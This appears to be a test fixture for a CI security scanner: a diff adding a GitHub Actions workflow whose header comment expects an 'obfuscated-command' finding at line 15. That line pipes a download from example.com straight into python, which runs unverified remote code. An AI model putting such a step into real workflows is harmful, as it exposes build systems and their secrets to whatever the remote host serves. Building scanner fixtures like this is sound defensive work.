@@ -1,0 +1,15 @@
+# bench:expect obfuscated-command@15
+name: download piped to python
+on: push
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+permissions:
+  contents: read
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: Install
+        run: curl https://example.com/install.py | python
